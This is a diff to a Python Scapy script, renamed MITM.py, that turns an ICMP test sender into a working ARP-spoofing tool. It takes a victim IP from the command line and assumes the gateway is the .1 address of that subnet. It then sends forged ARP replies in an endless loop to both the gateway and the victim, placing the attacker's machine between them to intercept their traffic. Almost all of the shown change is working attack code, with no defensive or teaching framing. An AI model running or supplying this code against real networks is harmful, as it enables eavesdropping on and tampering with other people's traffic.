@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-#running command: python ArpSpoofing.py victimIP
+#running command: python MITM.py victimIP
 
 import sys  #for command line argument
 import time
@@ -12,6 +12,7 @@ from scapy.all import *
 from scapy.layers.inet import *
 import scapy
 import socket
+import uuid 
 
 
 def get_ip():
@@ -29,12 +30,18 @@ def get_ip():
 
 my_ip = get_ip()
 
+my_mac = str(':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
+for ele in range(0,8*6,8)][::-1])) 
+
 victim_ip = sys.argv[1]
 
 # victim_ip = "192.168.0.106"	#for testing
 
-gateway_parts = str(victim_ip).split(".")
-gateway = gateway_parts[0]+ "."+gateway_parts[1]+ "."+gateway_parts[2]+ ".1" 
+
+network_parts = str(victim_ip).split(".")
+gateway = network_parts[0]+ "."+network_parts[1]+ "."+network_parts[2]+ ".1" 
+
+broadcastNet = network_parts[0]+ "."+network_parts[1]+ "."+network_parts[2]+ ".255" 
 
 # print(str(my_ip) + " " + str(victim_ip) + " " + gateway)
 
@@ -50,17 +57,14 @@ gateway_mac = result[ARP].hwsrc
 
 #######################################################################################################################
 
-ip_packet = IP(ttl=64)
-ip_packet.dst = gateway
-ip_packet.src = victim_ip
+reply1 = ARP(op=ARP.is_at, hwsrc=my_mac, psrc=victim_ip, hwdst=gateway_mac, pdst=gateway)
+go1 = Ether(dst=gateway_mac, src=my_mac) / reply1
 
+reply2 = ARP(op=ARP.is_at, hwsrc=my_mac, psrc=gateway, hwdst=victim_mac, pdst=victim_ip)
+go2 = Ether(dst=victim_mac, src=my_mac) / reply2
 
-icmp_packet = ip_packet/ICMP()/"Hello World"
+while  1:
+    sendp(go1, verbose = 2)
+    sendp(go2, verbose = 2)
 
-
-send(icmp_packet, verbose = 2, loop = 1)
-
-# while 1:
-	# send(ARP(op=ARP.is_at, psrc=victim_ip, hwdst="255.255.255.255", pdst="192.168.0.255"), verbose = 2)
-
-	
+    time.sleep(randint(1, 5))
